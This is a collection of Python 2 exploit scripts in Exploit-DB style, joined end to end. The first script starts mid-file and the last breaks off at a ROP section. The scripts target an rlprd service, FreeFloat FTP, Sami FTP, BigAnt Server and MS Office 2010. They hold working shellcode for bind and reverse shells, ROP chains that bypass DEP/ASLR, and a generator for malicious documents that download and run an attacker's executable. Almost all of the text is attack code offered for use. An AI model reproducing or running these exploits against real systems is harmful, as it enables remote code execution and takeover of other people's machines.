	lnx_readsc = "\x31\xdb\xf7\xe3\xb0\x03\x80\xc3\x04\x89\xe1\x4a\xcd\x80\xff\xe1"
	lnx_stage_one = "\x90" * (23 - len(lnx_readsc)) + lnx_readsc
	# dup2 shellcode(4->0,1,2)
	lnx_stage_two  = "\x31\xc0\x89\xc3\x89\xc1\x89\xc2\xb2\x3f\x88\xd0\xb3\x04" 
	lnx_stage_two += "\xcd\x80\x89\xd0\x41\xcd\x80\x89\xd0\x41\xcd\x80"
	# execute /bin/sh	
	lnx_stage_two += "\x90" * 100
	lnx_stage_two += "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68"
	lnx_stage_two += "\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
	lnx_stage_two += "\xe1\x8d\x42\x0b\xcd\x80"

	targets = [ [ 0 ], [ "Compiled test platform", 0x0804c418, 0xbffff9e8 ] ] 
		
	bruteforce = 0

	def __init__(self, host, os, target, port=7290):
		self.host = host
		self.port = port

		set = 0
		if(os == "linux"):
			set = 1
			self.stage_one = self.lnx_stage_one
			self.stage_two = self.lnx_stage_two

		if(set == 0):
			print "Unknown OS"
			os._exit()

		self.os = os
		
		if(target == 0):
			self.bruteforce = 1
		else:	
			self.args = self.targets[target]

	def wl16(self, write_byte):
		write_byte += 0x10000
		self.already_written %= 0x10000
		padding = (write_byte - self.already_written) % 0x10000
		if(padding < 10):
			padding += 0x10000

		self.already_written += padding

		return padding

	def connect(self):
		#if self.fd is not None:
		#	self.fd.close()
		#	self.fd = None

		self.fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
		self.fd.connect((self.host, self.port))
	
	def exploit(self, where, what):
		if(not self.fd or self.fd is None): self.connect()
		self.already_written = len('gethostbyname(')

		#print "# of nops: %d\n" % (23 - len(self.readsc))

		exploit = "x" * self.pad
		self.already_written += self.pad

		exploit += struct.pack("<l", where)
		exploit += struct.pack("<l", where + 2)
		self.already_written += 8		

		l = self.wl16(what & 0xffff)
		fill = "%1$" + str(l) + "u"
		exploit += fill

		exploit += "%7$hn"
		
		l = self.wl16(what >> 16)
		fill = "%1$" + str(l) + "u"
		exploit += fill

		exploit += "%8$hn"

		#print "[*] Format string: (%s) Len: %d" % (exploit, len(exploit))
		#print "[*] Stage 1 length: %d" % len(self.stage_one)

		#time.sleep(5)
		try:
			self.fd.send(exploit + self.stage_one + "\n")
			self.fd.send(self.stage_two)
			time.sleep(1)
			self.fd.send("echo spawned; uname -a; id -a;\n")
			print "Recieved: " + self.fd.recv(1024)
		except:
			self.fd.close()
			self.fd = None 
			print "\tFailed @ 0x%08x" % what
			return 0

		remote = telnetlib.Telnet()
		remote.sock = self.fd
		print "[*] You should now have a shell"
		remote.interact()
		os.exit(0)

	def force(self, where, high, lo):
		for i in range(high, lo, -8):
			r.exploit(where, i)

	def run(self):
		if(self.bruteforce):
			print "Bruteforcing.."
			#print "not implemented yet"
			#os._exit(1)
			for i in range(0x0804c000, 0x0804d000, 0x100 / 6):
				print "Trying: 0x%08x" % i
				self.force(i, 0xbffffa00, 0xbffff9c0)

		#self.exploit(self.args[1], self.args[2])

if __name__ == '__main__':
	if(len(sys.argv) != 4):
		print "%s host [linux] targetid"
		print "- 0 to brute force"
		print "- 1 custom compile"
		os._exit(0)

	print "%s-%s-%s" % (sys.argv[1], sys.argv[2], sys.argv[3])
	r = rlprd(sys.argv[1], sys.argv[2], int(sys.argv[3]))
	#r.exploit(0x0804c418, 0xbffff9e8)
	#r.force(0x0804c418, 0xbffffa00, 0xbffff800)
	r.run()

#!/usr/bin/env python

# Exploit Title: FreeFloat FTP raw commands buffer overflow
# Date: 10 Feb 2013
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://www.freefloat.com/
# Version: FreeFloat FTP 1.0
# Tested on: Windows XP Pro SP2, English
#
# Description: 
# FreeFloat FTP 1.0 allows an attacker to trigger a buffer overflow and 
# execute arbitrary code when a long and invalid raw command is sent to it. 
#

import socket, struct, sys

if len(sys.argv) < 3:
	print "usage: %s IP port" % (sys.argv[0])
	sys.exit(0)

ip = sys.argv[1]
port = int(sys.argv[2])

# Bind shellcode generated with msfvenom: 
#     msfvenom -p windows/shell_bind_tcp 
#         -b "\x00\x0a\x0b\x27\x36\xce\xc1\x04\x14\x3a\x44\xe0\x42\xa9\x0d" 
#         -e x86/fnstenv_mov 
#
# [*] x86/fnstenv_mov succeeded with size 366 (iteration=1)
shellcode = (
"\x6a\x56\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc8" +
"\x4c\xab\x8c\x83\xeb\xfc\xe2\xf4\x34\xa4\x22\x8c\xc8\x4c" +
"\xcb\x05\x2d\x7d\x79\xe8\x43\x1e\x9b\x07\x9a\x40\x20\xde" +
"\xdc\xc7\xd9\xa4\xc7\xfb\xe1\xaa\xf9\xb3\x9a\x4c\x64\x70" +
"\xca\xf0\xca\x60\x8b\x4d\x07\x41\xaa\x4b\x2a\xbc\xf9\xdb" +
"\x43\x1e\xbb\x07\x8a\x70\xaa\x5c\x43\x0c\xd3\x09\x08\x38" +
"\xe1\x8d\x18\x1c\x20\xc4\xd0\xc7\xf3\xac\xc9\x9f\x48\xb0" +
"\x81\xc7\x9f\x07\xc9\x9a\x9a\x73\xf9\x8c\x07\x4d\x07\x41" +
"\xaa\x4b\xf0\xac\xde\x78\xcb\x31\x53\xb7\xb5\x68\xde\x6e" +
"\x90\xc7\xf3\xa8\xc9\x9f\xcd\x07\xc4\x07\x20\xd4\xd4\x4d" +
"\x78\x07\xcc\xc7\xaa\x5c\x41\x08\x8f\xa8\x93\x17\xca\xd5" +
"\x92\x1d\x54\x6c\x90\x13\xf1\x07\xda\xa7\x2d\xd1\xa0\x7f" +
"\x99\x8c\xc8\x24\xdc\xff\xfa\x13\xff\xe4\x84\x3b\x8d\x8b" +
"\x37\x99\x13\x1c\xc9\x4c\xab\xa5\x0c\x18\xfb\xe4\xe1\xcc" +
"\xc0\x8c\x37\x99\xfb\xdc\x98\x1c\xeb\xdc\x88\x1c\xc3\x66" +
"\xc7\x93\x4b\x73\x1d\xc5\x6c\xbd\x13\x1f\xc3\x8e\xc8\x5d" +
"\xf7\x05\x2e\x26\xbb\xda\x9f\x24\x69\x57\xff\x2b\x54\x59" +
"\x9b\x1b\xc3\x3b\x21\x74\x54\x73\x1d\x1f\xf8\xdb\xa0\x38" +
"\x47\xb7\x29\xb3\x7e\xdb\x41\x8b\xc3\xf9\xa6\x01\xca\x73" +
"\x1d\x24\xc8\xe1\xac\x4c\x22\x6f\x9f\x1b\xfc\xbd\x3e\x26" +
"\xb9\xd5\x9e\xae\x56\xea\x0f\x08\x8f\xb0\xc9\x4d\x26\xc8" +
"\xec\x5c\x6d\x8c\x8c\x18\xfb\xda\x9e\x1a\xed\xda\x86\x1a" +
"\xfd\xdf\x9e\x24\xd2\x40\xf7\xca\x54\x59\x41\xac\xe5\xda" +
"\x8e\xb3\x9b\xe4\xc0\xcb\xb6\xec\x37\x99\x10\x7c\x7d\xee" +
"\xfd\xe4\x6e\xd9\x16\x11\x37\x99\x97\x8a\xb4\x46\x2b\x77" +
"\x28\x39\xae\x37\x8f\x5f\xd9\xe3\xa2\x4c\xf8\x73\x1d\x4c" +
"\xab\x8c"
)

# EIP overwritten at offset 251
# JMP ESP 7CA58265 SHELL32.DLL, Windows XP Pro SP2, English
jmpesp = struct.pack("<I", 0x7CA58265) 
buf = "\x41" * 251 + jmpesp + "\x90" * 129 + shellcode

print "[+] exploiting target %s:%d" % (ip, port)
print "[+] try connecting to %s on port 4444" % (ip)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.recv(1024)
s.send(buf + "\r\n")
#!/usr/bin/python

# Exploit Title: MS Office 2010 Download Execute
# Google Dork: NA
# Date: 19 Feb 2013
# Exploit Author: g11tch
# Vendor Homepage:
# Software Link:
# Version: ALL 
# Tested on: [Windows XP SP1, SP2, Windows 7 ]
# CVE :
##########
#Just generate a meterpreter .exe, then provide the link to it via the exploit, it will automagically download and run said .exe

import binascii
import sys
import time

print "Microsoft Office 2010, download -N- execute "
print " What do you want to name your  .doc ? "
print " Example:   TotallyTrusted.doc "
filename = raw_input()

print " What is the link to your .exe ? "
print "HINT!!:: Feed me a url. ie: http://super/eleet/payload.exe   "

url = raw_input()

print "Gears and Cranks working  mag1c in the background  "
time.sleep(3)
close="{}}}}}"
binme=binascii.b2a_hex(url)
file=('e1xydGYxbnNpbnNpY3BnMTI1MlxkZWZmMFxkZWZsYW5nMTAzM3sNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb250dGJsew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN3aXNzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFyc2V0MCBBcmlhbDt9fXtcKlxnZW5lcmF0b3IgTXNmdGVkaXQgNS40MS4xNS4xNTA3O30NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlld2tpbmQ0XHVjMVxwYXJkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHMyMCBwYXJkXGYwXGZzXHBhci90YWJccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhci5ccGFyLlxwYXIuXHBhclxwYXJ7XHNocHtcc3B9fXtcc2hwe1xzcH19e1xzaHB7XHNwfX17XHNocHtcKlxzaHBpbnN0XHNocGZoZHIwXHNocGJ4Y29sdW1uXHNocGJ5cGFyYVxzaCBwd3IyfXtcc3B7XHNue317fXtcc259e1xzbn17XCpcKn1wRnJhZ21lbnRzfXtcKlwqXCp9e1wqXCpcc3Z7XCp9OTsyO2ZmZmZmZmZmZmYjMDUwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwZTBiOTJjM2ZBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBNWMxMTEwM2ZhNTljMzgzZmNmYWYzOTNmMTAwMTA0MDEwMTAxMDEwMTAxMDEwMTAxZTBiOTJjM2YwMDgwMDAwMDQ2Y2IzOTNmZGVhZGJlZWZlMGI5MmMzZmMwM2QzYjNmY2MzMzIyM2ZkZjU5MmQzZmM0M2QzYjNmY2MxODJmM2ZjNDNkM2IzZjVlNzQyYjNmNWU3OTM5M2YyNDAwMDAwMDQ0Y2IzOTNmc2x1dGZ1Y2s2NzgyMzkzZmRlMTYzYTNmNjc4MjM5M2ZlMGI5MmMzZmMwM2QzYjNmYTU5YzM4M2Y3YzBhMmIzZmUwYjkyYzNmNTU2Njc3ODhjMDNkM2IzZmE1OWMzODNmZmJiZTM4M2ZlMGI5MmMzZjgwMDAwMDAwYjQ0MTM0M2Y1NTU1NTU1NTY2NjY2NjY2Y2ZhZjM5M2Y0MTQxNDE0MTQxNDE0MTQxNDE0MTQxNDE0MTQxNDE0MTQxNDE0MTQxNDE0MTQxNDE0MTQxNDE0MTQxZWI3NzMxYzk2NDhiNzEzMDhiNzYwYzhiNzYxYzhiNWUwODhiN2UyMDhiMzY2NjM5NGYxODc1ZjJjMzYwOGI2YzI0MjQ4YjQ1M2M4YjU0MDU3ODAxZWE4YjRhMTg4YjVhMjAwMWViZTMzNDQ5OGIzNDhiMDFlZTMxZmYzMWMwZmNhYzg0YzA3NDA3YzFjZjBkMDFjN2ViZjQzYjdjMjQyODc1ZTE4YjVhMjQwMWViNjY4YjBjNGI4YjVhMWMwMWViOGIwNDhiMDFlODg5NDQyNDFjNjFjM2U4OTJmZmZmZmY1ZjgxZWY5OGZmZmZmZmViMDVlOGVkZmZmZmZmNjg4ZTRlMGVlYzUzZTg5NGZmZmZmZjMxYzk2NmI5NmY2ZTUxNjg3NTcyNmM2ZDU0ZmZkMDY4MzYxYTJmNzA1MGU4N2FmZmZmZmYzMWM5NTE1MThkMzc4MWM2ZWVmZmZmZmY4ZDU2MGM1MjU3NTFmZmQwNjg5OGZlOGEwZTUzZTg1YmZmZmZmZjQxNTE1NmZmZDA2ODdlZDhlMjczNTNlODRiZmZmZmZmZmZkMDYzNmQ2NDJlNjU3ODY1MjAyZjYzMjAyMDYxMmU2NTc4NjUwMA==\n')
textfile = open(filename , 'w')
textfile.write(file.decode('base64')+binme+close)
textfile.close()
time.sleep(3)
print "enjoy"
#!/usr/bin/env python

# Exploit Title: Sami FTP LIST buffer overflow
# Date: 27 Feb 2013
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://www.karjasoft.com/old.php
# Version: Sami FTP Server 2.0.1
# Tested on: Windows XP Pro SP1, English
#            Windows XP Pro SP2, English
#
# Description: 
# A buffer overflow is triggered when a long LIST command is sent to the 
# server and the user views the Log tab. 
#

from socket import *
import struct, sys

IP = sys.argv[1]

# Windows bind shellcode from https://code.google.com/p/w32-bind-ngs-shellcode/
# Remove bad chars using msfencode: 
# msfencode -b "\x00\x0a\x0d\x2f" -i w32-bind-ngs-shellcode.bin 
# [*] x86/shikata_ga_nai succeeded with size 241 (iteration=1)
shellcode = (
"\xd9\xc7\xbe\x4d\xa5\xde\x30\xd9\x74\x24\xf4\x5f\x2b\xc9" +
"\xb1\x36\x31\x77\x19\x03\x77\x19\x83\xc7\x04\xaf\x50\xef" +
"\xf9\x4b\x10\x61\xca\x18\x50\x8e\xa1\x68\x81\x05\xdb\x9c" +
"\x32\x67\x04\x17\x72\xa0\x0b\x3f\x0e\x23\xc2\x57\xc2\x9c" +
"\xd6\x95\x4a\x45\x4f\xae\xf9\xe1\xd8\xdf\xf7\x69\xaf\x39" +
"\xb2\x89\x99\x09\x94\x41\x50\x76\x31\xaa\xc9\x39\xef\x0c" +
"\x5f\xee\x5e\x0c\xb0\x3c\xc5\x5d\xc4\x61\x39\xe9\x86\x84" +
"\x39\xec\xdd\x3d\xf2\xce\x20\xa8\x53\x3e\xf1\x68\xd7\x74" +
"\x64\x6d\x09\xc0\xb0\xc1\xe1\x58\x95\xdd\x36\xea\x90\x2a" +
"\x7c\x2b\x2e\x3f\xdf\xb8\x9b\x9b\xe1\x57\x14\x54\xf5\xf6" +
"\xa0\xd1\xea\xf9\x5f\x6c\xfa\xf9\x9b\xff\x50\x7d\x9d\xf6" +
"\xd3\x76\x6f\x56\x18\xd4\x90\xb6\x77\x4f\xee\x08\x0b\x1a" +
"\x5e\x2a\x46\x1b\x70\x7f\x67\x34\xe4\xfe\xb7\x4b\xf8\x8f" +
"\xfb\xd9\x17\xd8\x56\x48\xe7\x36\x2d\xb3\x63\x4e\x1f\xe6" +
"\xde\xc6\x03\x6b\xbb\x36\x49\x0f\x67\x0e\xfa\x5b\xcc\xa8" +
"\xbb\x72\x12\x60\xc3\xb9\x31\xdf\x99\x93\x6b\x19\x5a\xfb" +
"\x84\xf2\x37\x51\xc2\xae\x48\x03\x08\xc5\xf1\x50\x39\x13" +
"\x02\x57\x45"
)

# EIP overwritten at offset 218
# JMP ESP at 10028283 C:\Program Files\PMSystem\Temp\tmp0.dll (Universal)
buf = "A" * 218 + struct.pack("<I", 0x10028283) + "\x90" * 37 + shellcode

s = socket(AF_INET, SOCK_STREAM)
s.connect((IP,21))
print s.recv(1024)

s.send("USER superkojiman\r\n")
print s.recv(1024)

s.send("PASS letmein\r\n")
print s.recv(1024)

print "[+] sending payload of size", len(buf)
s.send("LIST " + buf + "\r\n")
print s.recv(1024)

s.close()
print "[+] sent. Connect to %s on port 28876" % (sys.argv[1],)
#!/usr/bin/python
#Title: BigAnt Server 2.97 DDNF Username Buffer Overflow
#Author: Craig Freyman (@cd1zz) http://pwnag3.com
#Tested on: Windows 7 64 bit (DEP/ASLR Bypass)
#Similar Exploits: 
#http://www.exploit-db.com/exploits/24528/
#http://www.exploit-db.com/exploits/24527/
#http://www.exploit-db.com/exploits/22466/

import socket,os,struct,sys,subprocess,time

if len(sys.argv) < 2:
     print "[-]Usage: %s <target addr> " % sys.argv[0] + "\r"
     sys.exit(0)

host = sys.argv[1]

#msfpayload windows/shell_bind_tcp LPORT=4444 R | msfencode -b "\x00\x0a\x0d\x20\x25\x27" 
sc = (
"\xd9\xec\xba\x1f\xaf\x04\x2d\xd9\x74\x24\xf4\x5d\x2b\xc9"
"\xb1\x56\x31\x55\x18\x03\x55\x18\x83\xc5\x1b\x4d\xf1\xd1"
"\xcb\x18\xfa\x29\x0b\x7b\x72\xcc\x3a\xa9\xe0\x84\x6e\x7d"
"\x62\xc8\x82\xf6\x26\xf9\x11\x7a\xef\x0e\x92\x31\xc9\x21"
"\x23\xf4\xd5\xee\xe7\x96\xa9\xec\x3b\x79\x93\x3e\x4e\x78"
"\xd4\x23\xa0\x28\x8d\x28\x12\xdd\xba\x6d\xae\xdc\x6c\xfa"
"\x8e\xa6\x09\x3d\x7a\x1d\x13\x6e\xd2\x2a\x5b\x96\x59\x74"
"\x7c\xa7\x8e\x66\x40\xee\xbb\x5d\x32\xf1\x6d\xac\xbb\xc3"
"\x51\x63\x82\xeb\x5c\x7d\xc2\xcc\xbe\x08\x38\x2f\x43\x0b"
"\xfb\x4d\x9f\x9e\x1e\xf5\x54\x38\xfb\x07\xb9\xdf\x88\x04"
"\x76\xab\xd7\x08\x89\x78\x6c\x34\x02\x7f\xa3\xbc\x50\xa4"
"\x67\xe4\x03\xc5\x3e\x40\xe2\xfa\x21\x2c\x5b\x5f\x29\xdf"
"\x88\xd9\x70\x88\x7d\xd4\x8a\x48\xe9\x6f\xf8\x7a\xb6\xdb"
"\x96\x36\x3f\xc2\x61\x38\x6a\xb2\xfe\xc7\x94\xc3\xd7\x03"
"\xc0\x93\x4f\xa5\x68\x78\x90\x4a\xbd\x2f\xc0\xe4\x6d\x90"
"\xb0\x44\xdd\x78\xdb\x4a\x02\x98\xe4\x80\x35\x9e\x2a\xf0"
"\x16\x49\x4f\x06\x89\xd5\xc6\xe0\xc3\xf5\x8e\xbb\x7b\x34"
"\xf5\x73\x1c\x47\xdf\x2f\xb5\xdf\x57\x26\x01\xdf\x67\x6c"
"\x22\x4c\xcf\xe7\xb0\x9e\xd4\x16\xc7\x8a\x7c\x50\xf0\x5d"
"\xf6\x0c\xb3\xfc\x07\x05\x23\x9c\x9a\xc2\xb3\xeb\x86\x5c"
"\xe4\xbc\x79\x95\x60\x51\x23\x0f\x96\xa8\xb5\x68\x12\x77"
"\x06\x76\x9b\xfa\x32\x5c\x8b\xc2\xbb\xd8\xff\x9a\xed\xb6"
"\xa9\x5c\x44\x79\x03\x37\x3b\xd3\xc3\xce\x77\xe4\x95\xce"
"\x5d\x92\x79\x7e\x08\xe3\x86\x4f\xdc\xe3\xff\xad\x7c\x0b"
"\x2a\x76\x8c\x46\x76\xdf\x05\x0f\xe3\x5d\x48\xb0\xde\xa2"
"\x75\x33\xea\x5a\x82\x2b\x9f\x5f\xce\xeb\x4c\x12\x5f\x9e"
"\x72\x81\x60\x8b")

#rop chain generated with mona.py - www.corelan.be
rop_gadgets = ""
rop_gadgets += struct.pack('<L',0x0f9edaa9)	# POP EDX # RETN [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x0fa021cc)	# ptr to &VirtualProtect() [IAT expsrv.dll]
rop_gadgets += struct.pack('<L',0x0f9ea2a7)	# MOV ECX,DWORD PTR DS:[EDX] # SUB EAX,ECX # RETN [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x0f9e0214)	# PUSH ECX # SUB AL,5F # POP ESI # POP EBP # RETN 0x24 [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x0f9ee3d9)	# POP ECX # RETN [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x0F9A5001)	# &Writable location 
rop_gadgets += struct.pack('<L',0x0f9f1e7c) # POP EDX # RETN  [expsrv.dll] 
rop_gadgets += struct.pack('<L',0xffffffff) # EDX starting value
for i in range(0,65): rop_gadgets += struct.pack('<L',0x0f9dbb5a)  # INC EDX # RETN ghetto style [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x0f9e65b6) # POP EAX # RETN [expsrv.dll] 
rop_gadgets += struct.pack('<L',0xfffffdff)	# Value to negate, will become 0x00000201
rop_gadgets += struct.pack('<L',0x0f9f2831) # NEG EAX # RETN [expsrv.dll]  
rop_gadgets += struct.pack('<L',0x0f9c5f4b) # POP EDI # RETN [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x0FA0C001) # put this in edi so the nex one doesnt die, writable for edi
rop_gadgets += struct.pack('<L',0x0f9e2be0) # PUSH EAX # OR BYTE PTR DS:[EDI+5E],BL # POP EBX # POP EBP # RETN 0x08    ** [expsrv.dll]
rop_gadgets += struct.pack('<L',0x0f9e24f9) # push esp # ret 0x08 |  {PAGE_EXECUTE_READ} [expsrv.dll
rop_gadgets += struct.pack('<L',0x0f9c5f4b)	# POP EDI # RETN [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x41414141)	# Filler (compensate)
rop_gadgets += struct.pack('<L',0x0f9e5cd2)	# RETN (ROP NOP) [expsrv.dll]
rop_gadgets += struct.pack('<L',0x0f9c8a3e)	# POP EAX # RETN [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x909006eb)	# nop with a ninja jump
rop_gadgets += struct.pack('<L',0x0f9f30c2)	# PUSHAD # RETN [expsrv.dll] 
rop_gadgets += struct.pack('<L',0x0f9e5cd2)	# RETN (ROP NOP) [expsrv.dll]

front = "A" * 684
seh = struct.pack('<L',0x0f9eeb8a) # ADD ESP,1004 [expsrv.dll]
back = "C" * 1592
stack_adjust = "\x81\xc4\x24\xfa\xff\xff"
junk = "D" * (4000 - (len(front) + len(seh) + len(back) + len(rop_gadgets) + len(stack_adjust) + len(sc))) 

sploit = front + seh + back + rop_gadgets + stack_adjust + sc + junk
print "[+] Sending pwnag3 to " + str(host)

try :
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,6661))
	s.send(""
	"DDNF 17\n"
	"classid: 100\n"
	"cmdid: 1\n"
	"objid: 1\n"
	"rootid: 3\n"
	"userid: 8\n"
	"username: "+sploit+
	"\r\n\r\n")
	time.sleep(1)
except:
	print "[-] There was a problem"
	sys.exit()

print "[+] Getting your shell. "
time.sleep(3)
subprocess.Popen("telnet "+host+" 4444",shell=True).wait()
print"[*] Done." 
s.close()

##############
# Exploit-DB Note:
# DEP/ASLR ROP chain for Windows 7 Pro Eng.
#
buffer = "\x41" * 684
# EIP hit here:
# Ajust stack to avoid SEH
stackajust = "\x8a\xeb\x9e\x0f"	# 0x0f9eeb8a  ADD ESP,1004 [expsrv.dll]
junk = "\x42" * 2028
# Place VirtualProtect() into ESI
rop = "\x3c\x7c\x9c\x0f"	# pop eax | retn [expsrv.dll]
rop+= "\xcc\x21\xa0\x0f"	# Ptr to kernerl.VirtualProtect
rop+= "\x4c\xe9\x9e\x0f"	# Move VirtualProtect into EAX
rop+= "\x42\x76\x9f\x0f"	# push eax | or al,5f | pop esi | pop ebp | pop ebx | pop ecx
# lpAddress into EBP (push esp 8)
rop+= "\xf9\x24\x9e\x0f"	# lpAddress into ebp push esp 8 | retn
rop+= "\x01\x05\x01\x01"	# huge dwSize in ebx
rop+= "\x41\x41\x41\x41"	# junk to pop into ecx
# 0x40 EDX flNewProtect
rop+= "\x87\xfd\x9f\x0f"	# pop edx
rop+= "\xff\xff\xff\xff"	#
for i in range(0,65):
	rop+="\x5a\xbb\x9d\x0f"	# increase cheap EDX
# lpflOldProtect Writeable address into ECX
rop+= "\x48\x76\x9f\x0f"	# pop ecx | retn
rop+= "\x01\x50\x9a\x0f"

# RETN inot EDI
rop+= "\xa8\x3a\x9a\x0f"	# pop edi | retn
rop+= "\x90\xeb\x9e\x0f"	# RETN rop

# Padding in EAX
rop+= "\x3c\x7c\x9c\x0f"        # pop eax | retn [expsrv.dll]
rop+= "\x90\x90\x90\x90"

# Pushad
rop+= "\xc2\x30\x9f\x0f"	# pushad | retn
rop+= "\x90\x90\x90\x90" * 3	# nop sled

payload = buffer + stackajust + junk + rop + sc
exploit = payload + "\x90" * (3999 - len(payload)) + "\xCC"
#!usr/bin/python
# Exploit title: FreeFloat ftp 1.0 DEP bypass with ROP 
#
# Exploit Author: negux 
#
# POC: http://www.exploit-db.com/exploits/24479/
# Tested on : Windows XP SP 3 Spanish
import socket,struct

# msfpayload windows/shell_reverse_tcp LHOST=192.168.1.117 LPORT=443 R | msfencode -a x86 -b '\x00\x0a\x0b\x27\x36\xce\xc1\x04\x14\x3a\x44\xe0\x42\xa9\x0d'

shellcode = (
"\x6a\x4f\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb7" +
"\x2d\xad\xa3\x83\xeb\xfc\xe2\xf4\x4b\xc5\x24\xa3\xb7\x2d" +
"\xcd\x2a\x52\x1c\x7f\xc7\x3c\x7f\x9d\x28\xe5\x21\x26\xf1" +
"\xa3\xa6\xdf\x8b\xb8\x9a\xe7\x85\x86\xd2\x9c\x63\x1b\x11" +
"\xcc\xdf\xb5\x01\x8d\x62\x78\x20\xac\x64\x55\xdd\xff\xf4" +
"\x3c\x7f\xbd\x28\xf5\x11\xac\x73\x3c\x6d\xd5\x26\x77\x59" +
"\xe7\xa2\x67\x7d\x26\xeb\xaf\xa6\xf5\x83\xb6\xfe\x4e\x9f" +
"\xfe\xa6\x99\x28\xb6\xfb\x9c\x5c\x86\xed\x01\x62\x78\x20" +
"\xac\x64\x8f\xcd\xd8\x57\xb4\x50\x55\x98\xca\x09\xd8\x41" +
"\xef\xa6\xf5\x87\xb6\xfe\xcb\x28\xbb\x66\x26\xfb\xab\x2c" +
"\x7e\x28\xb3\xa6\xac\x73\x3e\x69\x89\x87\xec\x76\xcc\xfa" +
"\xed\x7c\x52\x43\xef\x72\xf7\x28\xa5\xc6\x2b\xfe\xdf\x1e" +
"\x9f\xa3\xb7\x45\xda\xd0\x85\x72\xf9\xcb\xfb\x5a\x8b\xa4" +
"\x48\xf8\x15\x33\xb6\x2d\xad\x8a\x73\x79\xfd\xcb\x9e\xad" +
"\xc6\xa3\x48\xf8\xfd\xf3\xe7\x7d\xed\xf3\xf7\x7d\xc5\x49" +
"\xb8\xf2\x4d\x5c\x62\xa4\x6a\xcb\x77\x85\xac\xd6\xdf\x2f" +
"\xad\xa2\x0c\xa4\x4b\xc9\xa7\x7b\xfa\xcb\x2e\x88\xd9\xc2" +
"\x48\xf8\xc5\xc0\xda\x49\xad\x2a\x54\x7a\xfa\xf4\x86\xdb" +
"\xc7\xb1\xee\x7b\x4f\x5e\xd1\xea\xe9\x87\x8b\x2c\xac\x2e" +
"\xf3\x09\xbd\x65\xb7\x69\xf9\xf3\xe1\x7b\xfb\xe5\xe1\x63" +
"\xfb\xf5\xe4\x7b\xc5\xda\x7b\x12\x2b\x5c\x62\xa4\x4d\xed" +
"\xe1\x6b\x52\x93\xdf\x25\x2a\xbe\xd7\xd2\x78\x18\x47\x98" +
"\x0f\xf5\xdf\x8b\x38\x1e\x2a\xd2\x78\x9f\xb1\x51\xa7\x23" +
"\x4c\xcd\xd8\xa6\x0c\x6a\xbe\xd1\xd8\x47\xad\xf0\x48\xf8" +
"\xad\xa3")

## ROP 

